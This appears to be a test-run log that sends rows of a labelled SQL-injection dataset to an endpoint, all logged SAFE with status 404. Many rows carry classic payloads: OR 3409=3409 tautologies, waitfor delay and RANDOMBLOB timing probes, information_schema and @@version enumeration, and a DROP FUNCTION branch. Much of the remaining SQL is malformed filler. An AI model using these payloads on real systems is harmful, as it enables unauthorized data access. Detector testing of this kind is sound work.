SQL Injection Dataset Results
Start Time: 2026-04-05 15:32:05.442580

[1] SAFE | Status:404 | Time:0.008s | Payload: sql_query,injection_type,vulnerability_status,sql_command,target_table,selected_columns,comparison_operator,logical_operator,sql_comment_syntax
[1167] SAFE | Status:404 | Time:0.01s | Payload: CALL * FROM admin WHERE email = 'safe' NOT email = 'safe',None_Type,No,CALL,admin,*,=,NOT,
[1168] SAFE | Status:404 | Time:0.01s | Payload: "CALL user_id, product_id FROM employees WHERE id < 1 OR id < 'safe'",None_Type,No,CALL,employees,"user_id, product_id",<,OR,
[1169] SAFE | Status:404 | Time:0.01s | Payload: SELECT COUNT(*) FROM credentials WHERE id = 1 LIKE ORDER BY 13 --,Union-Based,Yes,SELECT,credentials,COUNT(*),=,LIKE,--
[1170] SAFE | Status:404 | Time:0.011s | Payload: "CALL id, email FROM transactions WHERE created_at <= 'test@example.com' OR created_at <= 1",None_Type,No,CALL,transactions,"id, email",<=,OR,
[1171] SAFE | Status:404 | Time:0.009s | Payload: DELETE FROM passwords WHERE id > 1 AND ORDER BY 18 --,Union-Based,Yes,DELETE,passwords,*,>,AND,--
[1172] SAFE | Status:404 | Time:0.009s | Payload: "SELECT id, email FROM sessions WHERE id >= 1 NOT id >= 'active'",None_Type,No,SELECT,sessions,"id, email",>=,NOT,
[1173] SAFE | Status:404 | Time:0.008s | Payload: "SELECT id, email FROM sessions WHERE id LIKE 'safe' OR id LIKE NULL",None_Type,No,SELECT,sessions,"id, email",LIKE,OR,
[1174] SAFE | Status:404 | Time:0.007s | Payload: "INSERT created_at, updated_at FROM admin WHERE id < 'safe' OR id < 'pending'",None_Type,No,INSERT,admin,"created_at, updated_at",<,OR,
[1175] SAFE | Status:404 | Time:0.007s | Payload: CALL MIN(created_at) FROM payments WHERE updated_at <= 1 AND updated_at <= NULL,None_Type,No,CALL,payments,MIN(created_at),<=,AND,
[1176] SAFE | Status:404 | Time:0.006s | Payload: SELECT MAX(price) FROM login WHERE id >= 'safe' OR id >= 'shipped',None_Type,No,SELECT,login,MAX(price),>=,OR,
[1177] SAFE | Status:404 | Time:0.007s | Payload: DELETE MIN(created_at) FROM sessions WHERE created_at BETWEEN 'safe' AND created_at BETWEEN 1,None_Type,No,DELETE,sessions,MIN(created_at),BETWEEN,AND,
[1178] SAFE | Status:404 | Time:0.007s | Payload: "DELETE id, email FROM login WHERE price > 'shipped' OR price > 'shipped'",None_Type,No,DELETE,login,"id, email",>,OR,
[1179] SAFE | Status:404 | Time:0.006s | Payload: "SELECT created_at, updated_at FROM employees WHERE status LIKE '2024-01-01' AND status LIKE 1",None_Type,No,SELECT,employees,"created_at, updated_at",LIKE,AND,
[1180] SAFE | Status:404 | Time:0.009s | Payload: EXEC('SELECT * FROM passwords WHERE id = 1 OR 3409=3409 AND (1=1)#'),boolean-based,Yes,EXEC,passwords,*,=,,
[1181] SAFE | Status:404 | Time:0.006s | Payload: "UPDATE id, email FROM login WHERE order_id = 'safe' OR order_id = 'test@example.com'",None_Type,No,UPDATE,login,"id, email",=,OR,
[1182] SAFE | Status:404 | Time:0.01s | Payload: "EXEC user_id, product_id FROM transactions WHERE status BETWEEN 'shipped' OR status BETWEEN NULL",None_Type,No,EXEC,transactions,"user_id, product_id",BETWEEN,OR,
[1183] SAFE | Status:404 | Time:0.01s | Payload: UPDATE users SET name = 'admin' AND ORDER BY 15# WHERE id != 1,Error-Based,Yes,UPDATE,users,*,!=,AND,
[1184] SAFE | Status:404 | Time:0.007s | Payload: "CALL price, status FROM sessions WHERE product_id = '2024-01-01' NOT product_id = '2024-01-01'",None_Type,No,CALL,sessions,"price, status",=,NOT,
[1185] SAFE | Status:404 | Time:0.005s | Payload: UPDATE MAX(price) FROM accounts WHERE price >= 'active' AND price >= 'test@example.com',None_Type,No,UPDATE,accounts,MAX(price),>=,AND,
[1186] SAFE | Status:404 | Time:0.007s | Payload: "UPDATE user_id, product_id FROM employees WHERE status IN 'pending' NOT status IN 'test@example.com'",None_Type,No,UPDATE,employees,"user_id, product_id",IN,NOT,
[1187] SAFE | Status:404 | Time:0.006s | Payload: "EXEC user_id, product_id FROM payments WHERE created_at >= 'shipped' OR created_at >= 'safe'",None_Type,No,EXEC,payments,"user_id, product_id",>=,OR,
[1188] SAFE | Status:404 | Time:0.009s | Payload: EXEC('SELECT MIN(created_at) FROM credentials WHERE id = 1 AND IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--'),Error-Based,Yes,EXEC,credentials,MIN(created_at),=,AND,
[1189] SAFE | Status:404 | Time:0.006s | Payload: "SELECT id, email FROM passwords WHERE id <= 1 IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl-- #",Error-Based,Yes,SELECT,passwords,"id, email",<=,,#
[1190] SAFE | Status:404 | Time:0.007s | Payload: "SELECT created_at, updated_at FROM transactions WHERE id > 1 NOT RANDOMBLOB(1000)",Time-Based,Yes,SELECT,transactions,"created_at, updated_at",>,NOT,
[1191] SAFE | Status:404 | Time:0.006s | Payload: "DELETE user_id, product_id FROM credentials WHERE product_id LIKE 'safe' NOT product_id LIKE 'pending'",None_Type,No,DELETE,credentials,"user_id, product_id",LIKE,NOT,
[1192] SAFE | Status:404 | Time:0.004s | Payload: "SELECT price, status FROM credentials WHERE id >= 1 LIKE ORDER BY 14-- #",Error-Based,Yes,SELECT,credentials,"price, status",>=,LIKE,#
[1193] SAFE | Status:404 | Time:0.008s | Payload: "SELECT created_at, updated_at FROM login WHERE id > 1 OR 3409=3409 AND ('pytW' LIKE 'pytY') --",boolean-based,Yes,SELECT,login,"created_at, updated_at",>,,--
[1194] SAFE | Status:404 | Time:0.007s | Payload: "SELECT user_id, product_id FROM users WHERE id != 1 ORDER BY 19 #",Union-Based,Yes,SELECT,users,"user_id, product_id",!=,,#
[1195] SAFE | Status:404 | Time:0.011s | Payload: "SELECT price, status FROM login WHERE id < 1 OR 3409=3409 AND (ASCII(SUBSTRING('admin',1,1)) = 97)# #",boolean-based,Yes,SELECT,login,"price, status",<,,#
[1196] SAFE | Status:404 | Time:0.007s | Payload: UPDATE login SET name = 'admin' LIKE ORDER BY 21# WHERE id != 1 #,Error-Based,Yes,UPDATE,login,*,!=,LIKE,#
[1197] SAFE | Status:404 | Time:0.009s | Payload: "INSERT user_id, product_id FROM credentials WHERE status IN 'active' NOT status IN 'safe'",None_Type,No,INSERT,credentials,"user_id, product_id",IN,NOT,
[1198] SAFE | Status:404 | Time:0.007s | Payload: EXEC('SELECT * FROM admin WHERE id = 1 NOT AND (SELECT LENGTH(password) FROM users WHERE username='admin') > 0 --') #,meta_based,Yes,EXEC,admin,*,=,NOT,#
[1199] SAFE | Status:404 | Time:0.009s | Payload: SELECT COUNT(*) FROM users WHERE id IN 'test@example.com' AND id IN 1,None_Type,No,SELECT,users,COUNT(*),IN,AND,
[1200] SAFE | Status:404 | Time:0.007s | Payload: EXEC * FROM transactions WHERE id != '2024-01-01' OR id != 'active',None_Type,No,EXEC,transactions,*,!=,OR,
[1201] SAFE | Status:404 | Time:0.008s | Payload: EXEC COUNT(*) FROM admin WHERE email > 'test@example.com' NOT email > NULL,None_Type,No,EXEC,admin,COUNT(*),>,NOT,
[1202] SAFE | Status:404 | Time:0.007s | Payload: "SELECT user_id, product_id FROM admin WHERE id >= 1 OR 3409=3409 AND (1=0) AND (ASCII(SUBSTRING('admin',1,1)) = 97) -- Check for 'a'",boolean-based,Yes,SELECT,admin,"user_id, product_id",>=,,
[1203] SAFE | Status:404 | Time:0.009s | Payload: "INSERT INTO employees (id, username) VALUES (1, OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2)))))",Time-Based,Yes,INSERT,employees,*,=,,
[1204] SAFE | Status:404 | Time:0.009s | Payload: EXEC('SELECT MIN(created_at) FROM credentials WHERE id < 1 OR x=x#') --,boolean-based,Yes,EXEC,credentials,MIN(created_at),<,,--
[1205] SAFE | Status:404 | Time:0.007s | Payload: "DELETE price, status FROM login WHERE created_at != NULL NOT created_at != '2024-01-01'",None_Type,No,DELETE,login,"price, status",!=,NOT,
[1206] SAFE | Status:404 | Time:0.005s | Payload: UPDATE * FROM sessions WHERE order_id > 'shipped' NOT order_id > 'test@example.com',None_Type,No,UPDATE,sessions,*,>,NOT,
[1207] SAFE | Status:404 | Time:0.01s | Payload: SELECT COUNT(*) FROM sessions WHERE product_id < 'test@example.com' NOT product_id < 'test@example.com',None_Type,No,SELECT,sessions,COUNT(*),<,NOT,
[1208] SAFE | Status:404 | Time:0.008s | Payload: "DELETE created_at, updated_at FROM users WHERE created_at != 'test@example.com' OR created_at != NULL",None_Type,No,DELETE,users,"created_at, updated_at",!=,OR,
[1209] SAFE | Status:404 | Time:0.008s | Payload: "EXEC id, email FROM admin WHERE email != '2024-01-01' AND email != 'pending'",None_Type,No,EXEC,admin,"id, email",!=,AND,
[1210] SAFE | Status:404 | Time:0.01s | Payload: "EXEC user_id, product_id FROM credentials WHERE price LIKE 'test@example.com' OR price LIKE NULL",None_Type,No,EXEC,credentials,"user_id, product_id",LIKE,OR,
[1211] SAFE | Status:404 | Time:0.014s | Payload: "DELETE price, status FROM credentials WHERE created_at IN 'safe' AND created_at IN 1",None_Type,No,DELETE,credentials,"price, status",IN,AND,
[1212] SAFE | Status:404 | Time:0.011s | Payload: "CALL created_at, updated_at FROM sessions WHERE order_id <= 'safe' AND order_id <= 'pending'",None_Type,No,CALL,sessions,"created_at, updated_at",<=,AND,
[1213] SAFE | Status:404 | Time:0.012s | Payload: "UPDATE id, email FROM sessions WHERE order_id IN 'shipped' NOT order_id IN 1",None_Type,No,UPDATE,sessions,"id, email",IN,NOT,
[1214] SAFE | Status:404 | Time:0.009s | Payload: INSERT MAX(price) FROM sessions WHERE order_id IN 1 OR order_id IN NULL,None_Type,No,INSERT,sessions,MAX(price),IN,OR,
[1215] SAFE | Status:404 | Time:0.009s | Payload: "UPDATE user_id, product_id FROM transactions WHERE status LIKE '2024-01-01' OR status LIKE 1",None_Type,No,UPDATE,transactions,"user_id, product_id",LIKE,OR,
[1216] SAFE | Status:404 | Time:0.009s | Payload: SELECT * FROM employees WHERE price = 'safe' OR price = 'pending',None_Type,No,SELECT,employees,*,=,OR,
[1217] SAFE | Status:404 | Time:0.008s | Payload: EXEC * FROM admin WHERE order_id < 'active' AND order_id < 'pending',None_Type,No,EXEC,admin,*,<,AND,
[1218] SAFE | Status:404 | Time:0.01s | Payload: SELECT MIN(created_at) FROM users WHERE id >= 1 NOT ORDER BY 14# #,Error-Based,Yes,SELECT,users,MIN(created_at),>=,NOT,#
[1219] SAFE | Status:404 | Time:0.009s | Payload: EXEC MAX(price) FROM sessions WHERE product_id < 'shipped' NOT product_id < 'safe',None_Type,No,EXEC,sessions,MAX(price),<,NOT,
[1220] SAFE | Status:404 | Time:0.007s | Payload: "SELECT MIN(created_at) FROM admin WHERE id > 1 AND "" OR (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users') > 0 -- #",meta_based,Yes,SELECT,admin,MIN(created_at),>,AND,#
[1221] SAFE | Status:404 | Time:0.007s | Payload: UPDATE MIN(created_at) FROM payments WHERE updated_at = 'shipped' OR updated_at = 'test@example.com',None_Type,No,UPDATE,payments,MIN(created_at),=,OR,
[1222] SAFE | Status:404 | Time:0.006s | Payload: "UPDATE transactions SET name = 'admin' WHERE id != 1 and (select substring(@@version,3,1))='c' #",Error-Based,Yes,UPDATE,transactions,*,!=,,#
[1223] SAFE | Status:404 | Time:0.005s | Payload: SELECT MAX(price) FROM transactions WHERE id != 1 ORDER BY 24--,Error-Based,Yes,SELECT,transactions,MAX(price),!=,,
[1224] SAFE | Status:404 | Time:0.006s | Payload: DELETE COUNT(*) FROM employees WHERE user_id != 'shipped' AND user_id != NULL,None_Type,No,DELETE,employees,COUNT(*),!=,AND,
[1225] SAFE | Status:404 | Time:0.005s | Payload: INSERT * FROM login WHERE user_id > 1 AND user_id > 'pending',None_Type,No,INSERT,login,*,>,AND,
[1226] SAFE | Status:404 | Time:0.004s | Payload: "UPDATE id, email FROM passwords WHERE product_id = 'active' NOT product_id = '2024-01-01'",None_Type,No,UPDATE,passwords,"id, email",=,NOT,
[1227] SAFE | Status:404 | Time:0.006s | Payload: "SELECT created_at, updated_at FROM accounts WHERE user_id BETWEEN 1 NOT user_id BETWEEN 1",None_Type,No,SELECT,accounts,"created_at, updated_at",BETWEEN,NOT,
[1228] SAFE | Status:404 | Time:0.006s | Payload: "SELECT created_at, updated_at FROM sessions WHERE id > 1 LIKE );waitfor delay '0:0:5'-- --",Time-Based,Yes,SELECT,sessions,"created_at, updated_at",>,LIKE,--
[1229] SAFE | Status:404 | Time:0.005s | Payload: INSERT MAX(price) FROM employees WHERE user_id IN 'safe' OR user_id IN 'safe',None_Type,No,INSERT,employees,MAX(price),IN,OR,
[1230] SAFE | Status:404 | Time:0.006s | Payload: SELECT MIN(created_at) FROM passwords WHERE id <= 1 NOT id <= 'pending',None_Type,No,SELECT,passwords,MIN(created_at),<=,NOT,
[1231] SAFE | Status:404 | Time:0.005s | Payload: EXEC('SELECT COUNT(*) FROM employees WHERE id < 1 OR x=y--') #,boolean-based,Yes,EXEC,employees,COUNT(*),<,,#
[1232] SAFE | Status:404 | Time:0.008s | Payload: SELECT COUNT(*) FROM admin WHERE id != 1 OR ORDER BY 26# --,Error-Based,Yes,SELECT,admin,COUNT(*),!=,OR,--
[1233] SAFE | Status:404 | Time:0.006s | Payload: "CALL created_at, updated_at FROM users WHERE price != '2024-01-01' NOT price != '2024-01-01'",None_Type,No,CALL,users,"created_at, updated_at",!=,NOT,
[1234] SAFE | Status:404 | Time:0.007s | Payload: "EXEC('SELECT user_id, product_id FROM transactions WHERE id = 1 OR UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name='users' --') --",meta_based,Yes,EXEC,transactions,"user_id, product_id",=,OR,--
[1235] SAFE | Status:404 | Time:0.008s | Payload: DELETE MIN(created_at) FROM login WHERE product_id <= 'pending' AND product_id <= 'shipped',None_Type,No,DELETE,login,MIN(created_at),<=,AND,
[1236] SAFE | Status:404 | Time:0.005s | Payload: "SELECT id, email FROM credentials WHERE id = 'pending' AND id = 'safe'",None_Type,No,SELECT,credentials,"id, email",=,AND,
[1237] SAFE | Status:404 | Time:0.005s | Payload: "DELETE price, status FROM transactions WHERE id <= 'shipped' NOT id <= 'shipped'",None_Type,No,DELETE,transactions,"price, status",<=,NOT,
[1238] SAFE | Status:404 | Time:0.004s | Payload: "INSERT id, email FROM passwords WHERE created_at <= NULL OR created_at <= 'safe'",None_Type,No,INSERT,passwords,"id, email",<=,OR,
[1239] SAFE | Status:404 | Time:0.007s | Payload: CALL COUNT(*) FROM passwords WHERE status < 'test@example.com' OR status < 1,None_Type,No,CALL,passwords,COUNT(*),<,OR,
[1240] SAFE | Status:404 | Time:0.005s | Payload: CALL * FROM admin WHERE updated_at = '2024-01-01' NOT updated_at = 'safe',None_Type,No,CALL,admin,*,=,NOT,
[1241] SAFE | Status:404 | Time:0.005s | Payload: EXEC COUNT(*) FROM login WHERE order_id <= 'shipped' AND order_id <= 'shipped',None_Type,No,EXEC,login,COUNT(*),<=,AND,
[1242] SAFE | Status:404 | Time:0.007s | Payload: UPDATE MAX(price) FROM login WHERE id = 'pending' AND id = 'shipped',None_Type,No,UPDATE,login,MAX(price),=,AND,
[1243] SAFE | Status:404 | Time:0.006s | Payload: CALL MAX(price) FROM credentials WHERE order_id LIKE 'test@example.com' OR order_id LIKE 'test@example.com',None_Type,No,CALL,credentials,MAX(price),LIKE,OR,
[1244] SAFE | Status:404 | Time:0.007s | Payload: UPDATE * FROM transactions WHERE price <= NULL NOT price <= '2024-01-01',None_Type,No,UPDATE,transactions,*,<=,NOT,
[1245] SAFE | Status:404 | Time:0.007s | Payload: DELETE * FROM sessions WHERE created_at IN 'active' OR created_at IN 'pending',None_Type,No,DELETE,sessions,*,IN,OR,
[1246] SAFE | Status:404 | Time:0.01s | Payload: SELECT MAX(price) FROM accounts WHERE id > 1 LIKE ORDER BY 17,Union-Based,Yes,SELECT,accounts,MAX(price),>,LIKE,
[1247] SAFE | Status:404 | Time:0.008s | Payload: "SELECT price, status FROM transactions WHERE email >= '2024-01-01' AND email >= NULL",None_Type,No,SELECT,transactions,"price, status",>=,AND,
[1248] SAFE | Status:404 | Time:0.007s | Payload: "SELECT COUNT(*) FROM employees WHERE id != 1 "";waitfor delay '0:0:5'--",Time-Based,Yes,SELECT,employees,COUNT(*),!=,,
[1249] SAFE | Status:404 | Time:0.006s | Payload: "INSERT id, email FROM employees WHERE order_id BETWEEN 'safe' NOT order_id BETWEEN 'test@example.com'",None_Type,No,INSERT,employees,"id, email",BETWEEN,NOT,
[1250] SAFE | Status:404 | Time:0.01s | Payload: "EXEC('SELECT id, email FROM credentials WHERE id < 1 OR 1=1 AND '1'='1--') #",stackqueries_based,Yes,EXEC,credentials,"id, email",<,Embedded in Payload,#
[1251] SAFE | Status:404 | Time:0.01s | Payload: SELECT * FROM accounts WHERE id = 'safe' OR id = 'shipped',None_Type,No,SELECT,accounts,*,=,OR,
[1252] SAFE | Status:404 | Time:0.01s | Payload: UPDATE MAX(price) FROM admin WHERE created_at > 'shipped' AND created_at > 'pending',None_Type,No,UPDATE,admin,MAX(price),>,AND,
[1253] SAFE | Status:404 | Time:0.012s | Payload: SELECT * FROM users WHERE id > 1 LIKE ORDER BY 12 --,Union-Based,Yes,SELECT,users,*,>,LIKE,--
[1254] SAFE | Status:404 | Time:0.01s | Payload: SELECT MAX(price) FROM login WHERE id < 1 LIKE ORDER BY 30--,Error-Based,Yes,SELECT,login,MAX(price),<,LIKE,
[1255] SAFE | Status:404 | Time:0.007s | Payload: "EXEC created_at, updated_at FROM payments WHERE id <= 'safe' NOT id <= 'test@example.com'",None_Type,No,EXEC,payments,"created_at, updated_at",<=,NOT,
[1256] SAFE | Status:404 | Time:0.005s | Payload: "EXEC('SELECT created_at, updated_at FROM employees WHERE id = 1 OR waitfor delay '00:00:05'') --",Time-Based,Yes,EXEC,employees,"created_at, updated_at",=,OR,--
[1257] SAFE | Status:404 | Time:0.006s | Payload: "EXEC('SELECT user_id, product_id FROM login WHERE id >= 1 OR 3409=3409 AND (1=0) AND (SUBSTRING('admin',1,2) = 'ad')') --",boolean-based,Yes,EXEC,login,"user_id, product_id",>=,,--
[1258] SAFE | Status:404 | Time:0.007s | Payload: UPDATE MIN(created_at) FROM sessions WHERE status = 'pending' OR status = 'shipped',None_Type,No,UPDATE,sessions,MIN(created_at),=,OR,
[1259] SAFE | Status:404 | Time:0.008s | Payload: "UPDATE created_at, updated_at FROM admin WHERE updated_at IN 'shipped' AND updated_at IN 'test@example.com'",None_Type,No,UPDATE,admin,"created_at, updated_at",IN,AND,
[1260] SAFE | Status:404 | Time:0.005s | Payload: CALL COUNT(*) FROM accounts WHERE id IN '2024-01-01' NOT id IN 'active',None_Type,No,CALL,accounts,COUNT(*),IN,NOT,
[1261] SAFE | Status:404 | Time:0.005s | Payload: CALL COUNT(*) FROM credentials WHERE id != '2024-01-01' AND id != 'shipped',None_Type,No,CALL,credentials,COUNT(*),!=,AND,
[1262] SAFE | Status:404 | Time:0.008s | Payload: SELECT * FROM employees WHERE id > 'active' OR id > 'active',None_Type,No,SELECT,employees,*,>,OR,
[1263] SAFE | Status:404 | Time:0.005s | Payload: CALL MAX(price) FROM sessions WHERE user_id LIKE 'active' NOT user_id LIKE NULL,None_Type,No,CALL,sessions,MAX(price),LIKE,NOT,
[1264] SAFE | Status:404 | Time:0.007s | Payload: CALL MIN(created_at) FROM accounts WHERE product_id >= 'test@example.com' AND product_id >= 'pending',None_Type,No,CALL,accounts,MIN(created_at),>=,AND,
[1265] SAFE | Status:404 | Time:0.006s | Payload: "UPDATE price, status FROM sessions WHERE id LIKE NULL OR id LIKE 1",None_Type,No,UPDATE,sessions,"price, status",LIKE,OR,
[1266] SAFE | Status:404 | Time:0.008s | Payload: SELECT * FROM payments WHERE id >= 1 NOT ORDER BY 29 #,Union-Based,Yes,SELECT,payments,*,>=,NOT,#
[1267] SAFE | Status:404 | Time:0.009s | Payload: CALL MAX(price) FROM employees WHERE status != 'shipped' OR status != 'safe',None_Type,No,CALL,employees,MAX(price),!=,OR,
[1268] SAFE | Status:404 | Time:0.01s | Payload: CALL MAX(price) FROM login WHERE id LIKE '2024-01-01' OR id LIKE 'safe',None_Type,No,CALL,login,MAX(price),LIKE,OR,
[1269] SAFE | Status:404 | Time:0.007s | Payload: "CALL id, email FROM payments WHERE order_id < '2024-01-01' NOT order_id < 1",None_Type,No,CALL,payments,"id, email",<,NOT,
[1270] SAFE | Status:404 | Time:0.01s | Payload: DELETE MIN(created_at) FROM login WHERE status < 'pending' AND status < NULL,None_Type,No,DELETE,login,MIN(created_at),<,AND,
[1271] SAFE | Status:404 | Time:0.007s | Payload: "SELECT user_id, product_id FROM sessions WHERE id >= 1 OR HAVING 1=0-- --",Error-Based,Yes,SELECT,sessions,"user_id, product_id",>=,OR,--
[1272] SAFE | Status:404 | Time:0.007s | Payload: SELECT COUNT(*) FROM transactions WHERE id = 1 ));waitfor delay '0:0:5'-- --,Time-Based,Yes,SELECT,transactions,COUNT(*),=,,--
[1273] SAFE | Status:404 | Time:0.007s | Payload: "EXEC id, email FROM passwords WHERE user_id > NULL OR user_id > 'active'",None_Type,No,EXEC,passwords,"id, email",>,OR,
[1274] SAFE | Status:404 | Time:0.009s | Payload: EXEC MIN(created_at) FROM payments WHERE created_at = NULL OR created_at = '2024-01-01',None_Type,No,EXEC,payments,MIN(created_at),=,OR,
[1275] SAFE | Status:404 | Time:0.005s | Payload: UPDATE MIN(created_at) FROM employees WHERE updated_at > 'test@example.com' AND updated_at > '2024-01-01',None_Type,No,UPDATE,employees,MIN(created_at),>,AND,
[1276] SAFE | Status:404 | Time:0.008s | Payload: DELETE FROM login WHERE id >= 1 NOT ORDER BY 20--,Error-Based,Yes,DELETE,login,*,>=,NOT,
[1277] SAFE | Status:404 | Time:0.006s | Payload: "DELETE created_at, updated_at FROM credentials WHERE created_at BETWEEN 'shipped' NOT created_at BETWEEN '2024-01-01'",None_Type,No,DELETE,credentials,"created_at, updated_at",BETWEEN,NOT,
[1278] SAFE | Status:404 | Time:0.009s | Payload: "EXEC created_at, updated_at FROM login WHERE updated_at <= 'safe' NOT updated_at <= 'test@example.com'",None_Type,No,EXEC,login,"created_at, updated_at",<=,NOT,
[1279] SAFE | Status:404 | Time:0.007s | Payload: DELETE COUNT(*) FROM users WHERE status != NULL OR status != 'test@example.com',None_Type,No,DELETE,users,COUNT(*),!=,OR,
[1280] SAFE | Status:404 | Time:0.007s | Payload: CALL MAX(price) FROM passwords WHERE price != 'safe' NOT price != 'safe',None_Type,No,CALL,passwords,MAX(price),!=,NOT,
[1281] SAFE | Status:404 | Time:0.008s | Payload: UPDATE MAX(price) FROM sessions WHERE id <= '2024-01-01' AND id <= 'safe',None_Type,No,UPDATE,sessions,MAX(price),<=,AND,
[1282] SAFE | Status:404 | Time:0.008s | Payload: UPDATE payments SET name = 'admin' LIKE waitfor delay '00:00:05'-- WHERE id > 1 #,Time-Based,Yes,UPDATE,payments,*,>,LIKE,#
[1283] SAFE | Status:404 | Time:0.005s | Payload: INSERT * FROM accounts WHERE price IN 'test@example.com' OR price IN 'test@example.com',None_Type,No,INSERT,accounts,*,IN,OR,
[1284] SAFE | Status:404 | Time:0.006s | Payload: CALL COUNT(*) FROM credentials WHERE created_at != 1 AND created_at != 'pending',None_Type,No,CALL,credentials,COUNT(*),!=,AND,
[1285] SAFE | Status:404 | Time:0.008s | Payload: UPDATE COUNT(*) FROM payments WHERE status LIKE '2024-01-01' NOT status LIKE NULL,None_Type,No,UPDATE,payments,COUNT(*),LIKE,NOT,
[1286] SAFE | Status:404 | Time:0.006s | Payload: CALL MAX(price) FROM accounts WHERE updated_at LIKE 'pending' AND updated_at LIKE 1,None_Type,No,CALL,accounts,MAX(price),LIKE,AND,
[1287] SAFE | Status:404 | Time:0.009s | Payload: "DELETE created_at, updated_at FROM login WHERE created_at >= '2024-01-01' AND created_at >= 'pending'",None_Type,No,DELETE,login,"created_at, updated_at",>=,AND,
[1288] SAFE | Status:404 | Time:0.007s | Payload: CALL MIN(created_at) FROM accounts WHERE email != 'test@example.com' NOT email != 'pending',None_Type,No,CALL,accounts,MIN(created_at),!=,NOT,
[1289] SAFE | Status:404 | Time:0.007s | Payload: "CALL created_at, updated_at FROM accounts WHERE id IN 'test@example.com' OR id IN NULL",None_Type,No,CALL,accounts,"created_at, updated_at",IN,OR,
[1290] SAFE | Status:404 | Time:0.005s | Payload: SELECT COUNT(*) FROM admin WHERE id >= 1 NOT ORDER BY 26#,Error-Based,Yes,SELECT,admin,COUNT(*),>=,NOT,
[1291] SAFE | Status:404 | Time:0.004s | Payload: "SELECT id, email FROM login WHERE id >= 'active' OR id >= 'shipped'",None_Type,No,SELECT,login,"id, email",>=,OR,
[1292] SAFE | Status:404 | Time:0.007s | Payload: "INSERT price, status FROM users WHERE updated_at != 'active' AND updated_at != '2024-01-01'",None_Type,No,INSERT,users,"price, status",!=,AND,
[1293] SAFE | Status:404 | Time:0.006s | Payload: "SELECT MIN(created_at) FROM payments WHERE id != 1 OR 1=1 UNION SELECT @@version_compile_os, @@version_compile_machine, null, null-- --",stackqueries_based,Yes,SELECT,payments,MIN(created_at),!=,Embedded in Payload,--
[1294] SAFE | Status:404 | Time:0.007s | Payload: EXEC COUNT(*) FROM employees WHERE user_id <= 'pending' NOT user_id <= 'active',None_Type,No,EXEC,employees,COUNT(*),<=,NOT,
[1295] SAFE | Status:404 | Time:0.007s | Payload: "SELECT created_at, updated_at FROM transactions WHERE order_id IN NULL NOT order_id IN 'safe'",None_Type,No,SELECT,transactions,"created_at, updated_at",IN,NOT,
[1296] SAFE | Status:404 | Time:0.008s | Payload: "CALL created_at, updated_at FROM passwords WHERE product_id LIKE 'pending' AND product_id LIKE 'active'",None_Type,No,CALL,passwords,"created_at, updated_at",LIKE,AND,
[1297] SAFE | Status:404 | Time:0.007s | Payload: "DELETE id, email FROM admin WHERE updated_at = 'safe' NOT updated_at = '2024-01-01'",None_Type,No,DELETE,admin,"id, email",=,NOT,
[1298] SAFE | Status:404 | Time:0.008s | Payload: SELECT * FROM employees WHERE created_at = 'pending' NOT created_at = 'shipped',None_Type,No,SELECT,employees,*,=,NOT,
[1299] SAFE | Status:404 | Time:0.007s | Payload: UPDATE admin SET name = 'admin' NOT ORDER BY 19# WHERE id = 1 --,Error-Based,Yes,UPDATE,admin,*,=,NOT,--
[1300] SAFE | Status:404 | Time:0.005s | Payload: SELECT * FROM passwords WHERE email < NULL OR email < 1,None_Type,No,SELECT,passwords,*,<,OR,
[1301] SAFE | Status:404 | Time:0.007s | Payload: "EXEC user_id, product_id FROM users WHERE status <= '2024-01-01' OR status <= NULL",None_Type,No,EXEC,users,"user_id, product_id",<=,OR,
[1302] SAFE | Status:404 | Time:0.007s | Payload: EXEC MAX(price) FROM employees WHERE email = 'shipped' NOT email = 'test@example.com',None_Type,No,EXEC,employees,MAX(price),=,NOT,
[1303] SAFE | Status:404 | Time:0.009s | Payload: "CALL created_at, updated_at FROM users WHERE email BETWEEN 'shipped' NOT email BETWEEN 'pending'",None_Type,No,CALL,users,"created_at, updated_at",BETWEEN,NOT,
[1304] SAFE | Status:404 | Time:0.007s | Payload: DELETE FROM login WHERE id = 1 NOT OR (SELECT table_name FROM information_schema.tables WHERE table_name='users') IS NOT NULL -- #,meta_based,Yes,DELETE,login,,=,NOT,#
